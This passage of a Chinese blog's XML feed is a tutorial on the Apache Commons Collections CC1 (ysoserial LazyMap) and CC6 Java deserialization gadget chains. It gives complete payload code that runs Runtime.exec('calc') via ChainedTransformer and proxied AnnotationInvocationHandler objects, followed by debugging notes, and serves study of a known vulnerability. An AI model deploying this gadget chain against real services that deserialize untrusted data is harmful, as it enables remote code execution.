&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 HashMap</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(tiedMapEntry, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 删除 lazymap 对象中的 key 值</span><br><span class="line">        lazymap.remove(&quot;key&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 lazymap 对象的 factory 属性</span><br><span class="line">        Class&lt;? extends Map&gt; lazymapClass = lazymap.getClass();</span><br><span class="line">        Field factory = lazymapClass.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazymap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // serialize(map);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此就完成了。</p><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>真理是越辩越明的。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前面在分析 CC1链 的 ysoserial 版时，我们知道 LazyMap 的 get 方法会调用成员属性 factory 的 transform 方法，而我们上一次是通过 AnnotationInvocationHandler 的 invoke 方法来调用这个 get 方法的。那么还有哪里能调用 LazyMap 的 get 方法呢？我们的 CC6 链给出了另一条路径：TiedMapEntry 类的 getValue 方法会调用成员属性的 get 方法。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>漏洞篇 - CC1 链之 ysoserial 版</title>
    <link href="https://changeyourway.github.io/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BEysoserial%E7%89%88/"/>
    <id>https://changeyourway.github.io/2024/05/12/Java%20%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E7%AF%87-CC1%E9%93%BEysoserial%E7%89%88/</id>
    <published>2024-05-12T10:20:51.663Z</published>
    <updated>2024-05-14T00:48:10.674Z</updated>
    
    <content type="html"><![CDATA[<p>在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap  也可以作为利用链，它们都在 org.apache.commons.collections.map 包下。这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。</p><span id="more"></span><h2 id="CC1-链之-ysoserial-版"><a href="#CC1-链之-ysoserial-版" class="headerlink" title="CC1 链之 ysoserial 版"></a>CC1 链之 ysoserial 版</h2><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><ul><li>JDK &#x3D; 8u65</li><li>commons-collections &#x3D; 3.2.1</li></ul><p>在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap  也可以作为利用链，它们都在 org.apache.commons.collections.map 包下：</p><img src="/images/image-20240512110643357.png"><p>这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。</p><p>前面我们利用 TransformedMap 类的 checkSetValue 方法来调用 transform 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return this.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么回到这一步，还有谁调用了 transform 方法呢？LazyMap 中其实有相关的调用。</p><h4 id="利用链之-LazyMap-类"><a href="#利用链之-LazyMap-类" class="headerlink" title="利用链之 LazyMap 类"></a>利用链之 LazyMap 类</h4><p>LazyMap 的 get 方法中调用了 factory 的 transform 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public Object get(Object key) &#123;</span><br><span class="line">    // create value for key if key is not currently in the map</span><br><span class="line">    if (map.containsKey(key) == false) &#123;</span><br><span class="line">        Object value = factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        return value;</span><br><span class="line">    &#125;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>factory 是 LazyMap 中定义的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protected final Transformer factory;</span><br></pre></td></tr></table></figure><p>它在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">protected LazyMap(Map map, Transformer factory) &#123;</span><br><span class="line">    super(map);</span><br><span class="line">    if (factory == null) &#123;</span><br><span class="line">        throw new IllegalArgumentException(&quot;Factory must not be null&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.factory = factory;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们让这里的 factory 变成 ChainedTransformer 对象就行。</p><p>然而 LazyMap 的构造方法被 protected 修饰，不能直接调用，所以我们需要找哪个方法调用了 LazyMap 的构造方法。</p><p>LazyMap 的 decorate 方法中调用了 LazyMap 的构造方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public static Map decorate(Map map, Transformer factory) &#123;</span><br><span class="line">    return new LazyMap(map, factory);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们可以通过这个方法来给 factory 赋值。</p><p>接下来就是找哪里调用了 LazyMap 的 get 方法了，AnnotationInvocationHandler 的 invoke 方法有相关的调用。</p><h4 id="AnnotationInvocationHandler-入口类"><a href="#AnnotationInvocationHandler-入口类" class="headerlink" title="AnnotationInvocationHandler 入口类"></a>AnnotationInvocationHandler 入口类</h4><h6 id="AnnotationInvocationHandler-的-invoke-方法："><a href="#AnnotationInvocationHandler-的-invoke-方法：" class="headerlink" title="AnnotationInvocationHandler 的 invoke 方法："></a>AnnotationInvocationHandler 的 invoke 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">public Object invoke(Object proxy, Method method, Object[] args) &#123;</span><br><span class="line">    String member = method.getName();</span><br><span class="line">    Class&lt;?&gt;[] paramTypes = method.getParameterTypes();</span><br><span class="line"></span><br><span class="line">    // Handle Object and Annotation methods</span><br><span class="line">    if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp;</span><br><span class="line">        paramTypes[0] == Object.class)</span><br><span class="line">        return equalsImpl(args[0]);</span><br><span class="line">    if (paramTypes.length != 0)</span><br><span class="line">        throw new AssertionError(&quot;Too many parameters for an annotation method&quot;);</span><br><span class="line"></span><br><span class="line">    switch(member) &#123;</span><br><span class="line">    case &quot;toString&quot;:</span><br><span class="line">        return toStringImpl();</span><br><span class="line">    case &quot;hashCode&quot;:</span><br><span class="line">        return hashCodeImpl();</span><br><span class="line">    case &quot;annotationType&quot;:</span><br><span class="line">        return type;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Handle annotation member accessors</span><br><span class="line">    Object result = memberValues.get(member);</span><br><span class="line"></span><br><span class="line">    if (result == null)</span><br><span class="line">        throw new IncompleteAnnotationException(type, member);</span><br><span class="line"></span><br><span class="line">    if (result instanceof ExceptionProxy)</span><br><span class="line">        throw ((ExceptionProxy) result).generateException();</span><br><span class="line"></span><br><span class="line">    if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0)</span><br><span class="line">        result = cloneArray(result);</span><br><span class="line"></span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>它调用了 memberValues 的 get 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Handle annotation member accessors</span><br><span class="line">Object result = memberValues.get(member);</span><br></pre></td></tr></table></figure><p>memberValues 是 AnnotationInvocationHandler 类的属性：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">private final Map&lt;String, Object&gt; memberValues;</span><br></pre></td></tr></table></figure><p>它在构造方法中被赋值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">    Class&lt;?&gt;[] superInterfaces = type.getInterfaces();</span><br><span class="line">    if (!type.isAnnotation() ||</span><br><span class="line">        superInterfaces.length != 1 ||</span><br><span class="line">        superInterfaces[0] != java.lang.annotation.Annotation.class)</span><br><span class="line">        throw new AnnotationFormatError(&quot;Attempt to create proxy for a non-annotation type.&quot;);</span><br><span class="line">    this.type = type;</span><br><span class="line">    this.memberValues = memberValues;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里可以依照前面的办法：利用反射调用 AnnotationInvocationHandler 的构造方法，将 memberValues 赋值成 LazyMap 对象。</p><p>那么又要如何调用 AnnotationInvocationHandler 的 invoke 方法呢？</p><p>AnnotationInvocationHandler 其实是一个代理类，它继承了 InvocationHandler 类，并重写了 invoke 方法。而我们知道，在调用代理对象的方法时，InvocationHandler 类的 invoke 方法将会被触发。（这方面与 Java 动态代理有关，可以去看我先前的文章）</p><p>假使我用 AnnotationInvocationHandler 来构建一个代理对象，那么只要这个代理对象的任意方法被调用，就会调用 AnnotationInvocationHandler 的 invoke 方法了。</p><p>那么为了能够反序列化利用，我们还是要回到 readObject 方法。</p><h6 id="AnnotationInvocationHandler-的-readObject-方法："><a href="#AnnotationInvocationHandler-的-readObject-方法：" class="headerlink" title="AnnotationInvocationHandler 的 readObject 方法："></a>AnnotationInvocationHandler 的 readObject 方法：</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    // Check to make sure that types have not evolved incompatibly</span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = null;</span><br><span class="line">    try &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; catch(IllegalArgumentException e) &#123;</span><br><span class="line">        // Class is no longer an annotation type; time to punch out</span><br><span class="line">        throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    // If there are annotation members without values, that</span><br><span class="line">    // situation is handled by the invoke method.</span><br><span class="line">    for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        if (memberType != null) &#123;  // i.e. member still exists</span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            if (!(memberType.isInstance(value) ||</span><br><span class="line">                  value instanceof ExceptionProxy)) &#123;</span><br><span class="line">                memberValue.setValue(</span><br><span class="line">                    new AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                        value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember(</span><br><span class="line">                            annotationType.members().get(name)));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>沿用前辈们的思路，我们将触发点选为 memberValues.entrySet() ，只需要将 memberValues 设置成用 AnnotationInvocationHandler 构建的代理对象，那么在调用这个代理对象的任意方法时，都会调用 AnnotationInvocationHandler 的 invoke 方法。</p><p>这听起来似乎很矛盾，前面说 memberValues 要赋值成 LazyMap 对象，怎么这里又说 memberValues 要设置成用 AnnotationInvocationHandler 构建的代理对象呢？后面会给出解答。</p><h4 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.commons.collections.Transformer;</span><br><span class="line">import org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line">import org.apache.commons.collections.map.LazyMap;</span><br><span class="line">import org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.annotation.Retention;</span><br><span class="line">import java.lang.annotation.Target;</span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.InvocationHandler;</span><br><span class="line">import java.lang.reflect.Proxy;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">public class FinalPayload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 获取包含执行类的 ChainedTransformer 对象</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                // 将传入参数固定为 Runtime.class</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer</span><br><span class="line">                        (&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        // 新建一个 Map 对象，无关紧要，只是作为参数传入</span><br><span class="line">        Map&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        // 初始化利用链 LazyMap</span><br><span class="line">        Map lazymap = LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        // 利用反射修改入口类 AnnotationInvocationHandler 的 memberValues 属性</span><br><span class="line">        </span><br><span class="line">        // 获取 AnnotationInvocationHandler 的构造器对象</span><br><span class="line">        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);</span><br><span class="line">        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(true);</span><br><span class="line">        </span><br><span class="line">        // 因为不经过判断，第一个参数只要是注解类就行，第二个参数传入 Lazymap 对象作为 memberValues 的值</span><br><span class="line">        Object annotationInvocationHandler1 = constructor.newInstance(Override.class, lazymap);</span><br><span class="line"></span><br><span class="line">        // 现在我已经通过构造方法获取了一个 AnnotationInvocationHandler 对象</span><br><span class="line">        // 接下来将这个对象强转成 InvocationHandler 类型，然后用它来获取代理对象</span><br><span class="line">        InvocationHandler invocationHandler = (InvocationHandler) annotationInvocationHandler1;</span><br><span class="line"></span><br><span class="line">        // 为了之后能将代理对象作为参数传入 AnnotationInvocationHandler 的构造方法</span><br><span class="line">        // 这里选择创建一个 Map 类型的代理对象</span><br><span class="line">        Map mapProxy = (Map) Proxy.newProxyInstance(</span><br><span class="line">                // 第一个参数是构造器</span><br><span class="line">                Map.class.getClassLoader(),</span><br><span class="line">                // 第二个参数指明代理对象继承的接口</span><br><span class="line">                new Class[]&#123;Map.class&#125;,</span><br><span class="line">                // 第三个参数需要一个重写了 invoke 方法的 InvocationHandler 对象</span><br><span class="line">                // 这个对象的 invoke 方法将会在代理对象的任意方法被调用时调用</span><br><span class="line">                invocationHandler</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // 传入 mapProxy 代理对象作为 memberValues 的值</span><br><span class="line">        Object annotationInvocationHandler2 = constructor.newInstance(Override.class, mapProxy);</span><br><span class="line"></span><br><span class="line">        // serialize(annotationInvocationHandler2);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看完 payload 想必就能理解了，我们将代理对象作为 AnnotationInvocationHandler 对象 annotationInvocationHandler2 的 memberValues 属性值，在反序列化时，调用 annotationInvocationHandler2 的 readObject 方法，进而调用 memberValues 的 entrySet() 方法（即代理对象的 entrySet() 方法），此时将会调用代理对象对应的 invoke 方法，这个 invoke 方法正是 annotationInvocationHandler1 的 invoke 方法，annotationInvocationHandler1 的 invoke 方法会调用 memberValues 的 get 方法，而 annotationInvocationHandler1 的 memberValues 属性已经被赋值成 LazyMap 对象了，于是这里调用的是 LazyMap 对象的 get 方法。</p><p>我再画个流程图来帮助理解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">annotationInvocationHandler2 :: readObject() -&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler2.memberValues :: entrySet()（annotationInvocationHandler2.memberValues = mapProxy）-&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler1 :: invoke()（annotationInvocationHandler1.memberValues = lazymap）-&gt;</span><br><span class="line"></span><br><span class="line">lazymap :: get() -&gt; </span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>想必应该能理解了。</p><h4 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h4><p>调试既是为了验证理论的正确性，又是为了加深理解，还可以发现未知的细节。</p><p>先执行序列化方法，生成文件之后，对反序列化方法做调试。</p><p>主程序 readObject 处下断点：</p><img src="/images/image-20240512161824902.png"><p>AnnotationInvocationHandler.java 的 readObject 方法中的 memberValues.entrySet() 处下断点：</p><img src="/images/image-20240512160558799.png"><p>AnnotationInvocationHandler.java 的 invoke 方法中的 memberValues.get 处下断点：</p><img src="/images/image-20240512160653773.png"><p>开始调试：</p><img src="/images/image-20240512162118714.png"><p>单步进入：进入了 AbstractMapDecorator 类，过程省略。</p><p>接着单步进入，此时来到了 LazyMap 的 readObject 方法：</p><img src="/images/image-20240512162257878.png"><p>执行完 LazyMap 的 readObject 方法以后就来到了 AnnotationInvocationHandler 的 invoke 方法：</p><img src="/images/image-20240512162547906.png"><p>调用堆栈也出现了很多调用，细看之下，又跟我们的利用链毫无关系。至于这里为什么会提前调用 invoke 方法，容后再议。</p><p>继续调试，经过断点 memberValues.entrySet() ：</p><img src="/images/image-20240512163445617.png"><p>继续调试，不断单步进入又跳出，执行完之后会发现弹出了计算器，而且是三个：</p><img src="/images/image-20240512170907564.png"><p>调试发现中间调用了一大堆乱七八糟的类，实在没有耐心看了，就引用 yhy 师傅的一个比较有说服力的结论吧：</p><p>IDEA 在 debug 时，当 debug 到某个对象的时候，会调用对象的 toString() 方法，用来在 debug 界面显示对象信息。弹出多个计算器，多半是由于代理对象的 toString() 方法被私自调用了，触发了 invoke 方法，造成非预期的命令执行。</p><p>我们可以在 IDEA 中关闭 Debug 自动调用 toString() 方法：</p><img src="/images/image-20240512165453774.png"><p>至于为什么关闭这个设置后调试仍然弹出了三个计算器，我就不得而知了。</p><p>那么，接下来才是重头戏。我们重新设置断点，重新调试。</p><h4 id="反序列化是由内向外的"><a href="#反序列化是由内向外的" class="headerlink" title="反序列化是由内向外的"></a>反序列化是由内向外的</h4><p>在 AnnotationInvocationHandler 类的 readObject 方法中新增一处断点，这一断点是在上一次调试中发现的转折点：</p><img src="/images/image-20240512170719041.png"><p>其余断点不变，开始调试：</p><img src="/images/image-20240512171015189.png"><p>单步进入几次：</p><img src="/images/image-20240512171047443.png"><p>现在调用的是 LazyMap 的 readObject ，说明 LazyMap 相比其他对象是最先被反序列化的。</p><p>继续单步进入：</p><img src="/images/image-20240512171344943.png"><p>跳出 LazyMap 的 readObject 方法之后，我们就来到了 AnnotationInvocationHandler 的 readObject 方法，观察 this.memberValues 值，发现它是一个 LazyMap 对象，这说明什么？说明此时反序列化的这个 AnnotationInvocationHandler 对象是 mapProxy 代理对象在创建时作为参数传入的 AnnotationInvocationHandler 对象，而不是最外部的 AnnotationInvocationHandler 对象。</p><p>即此时反序列化的是 annotationInvocationHandler1 对象。</p><p>接下来单步进入会进入 AnnotationType 类的 getInstance 方法，这个方法又会调用 AnnotationType 的构造方法，在构造方法中我们发现行进到这一步时：</p><img src="/images/image-20240512174213941.png"><p>这里的 ret 已然是一个代理对象，调用 ret.value() 将会进入某个代理类的 invoke 方法。</p><p>再下一步就来到了 AnnotationInvocationHandler 对象的 invoke 方法：</p><img src="/images/image-20240512172104085.png"><p>这就是我们之前遇到的 invoke 方法被提前调用的问题。观察下面的 memberValues 属性值可以发现，此时执行 invoke 方法的 AnnotationInvocationHandler 对象并不是 annotationInvocationHandler1 ，因此这一步调用 invoke 并不会造成命令执行，事实也正是如此。</p><p>想必这里调用 AnnotationInvocationHandler 的 invoke 方法是 AnnotationType 类的内部逻辑，至于 ret 是如何成为由 AnnotationInvocationHandler 构建的代理对象的，我就不深究了。</p><p>继续调试，执行完这一步后，我们回到 annotationInvocationHandler1 的 readObject 方法：</p><img src="/images/image-20240512174853686.png"><p>直接跳到下个断点吧：</p><img src="/images/image-20240512174958974.png"><p>继续调试，当执行完这一步时，我们又来到了 AnnotationInvocationHandler 类的这个断点处：</p><img src="/images/image-20240512175126308.png"><p>并且弹出了三个计算器，说明命令执行在上一步已经完成了，至于这个 AnnotationInvocationHandler 对象，看看它的 memberValues 属性值会发现是一个代理对象，也就是说我们现在正在执行外部的 AnnotationInvocationHandler 对象也即 annotationInvocationHandler2 的 readObject 方法，这一步的 readObject 方法并不会造成命令执行，事实也正是如此，后面的就不用看了，至此，调试完毕。</p><p>通过调试，我们可以发现：<strong>反序列化是由内向外的</strong>。而我们之前所预测的调用链被推翻，接下来我会记录下真正的调用链。</p><h4 id="重新书写调用链"><a href="#重新书写调用链" class="headerlink" title="重新书写调用链"></a>重新书写调用链</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">反序列化 -&gt; </span><br><span class="line"></span><br><span class="line">lazyMap :: readObject() -&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler1 :: readObject() -&gt;</span><br><span class="line"></span><br><span class="line">​AnnotationType :: getInstance() -&gt;</span><br><span class="line"></span><br><span class="line">​AnnotationType :: AnnotationType() -&gt;</span><br><span class="line"></span><br><span class="line">​AnnotationInvocationHandler :: invoke() （提前调用 invoke ，但不会命令执行）-&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler1.memberValues :: entrySet() -&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler1 :: invoke() -&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler1.memberValues :: get() （即 lazyMap :: get()，造成命令执行）-&gt;</span><br><span class="line"></span><br><span class="line">annotationInvocationHandler2 :: readObject() -&gt;</span><br><span class="line"></span><br><span class="line">结束</span><br></pre></td></tr></table></figure><h4 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h4><p>真理的相对性也是真理之一，实践是检验真理的唯一标准。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在前面学习 CC1 链时，我们使用 TransformedMap 作为利用链，但其实除了 TransformedMap 之外，还有 DefaultedMap 和 LazyMap  也可以作为利用链，它们都在 org.apache.commons.collections.map 包下。这一节我们来分析 ysoserial 工具中利用的 CC1 链，它是将 LazyMap 作为利用链的。&lt;/p&gt;</summary>
    
    
    
    <category term="Java 安全" scheme="https://changeyourway.github.io/categories/Java-%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>配置篇 - IDEA 查看带 sun 包的 JDK 源码</title>
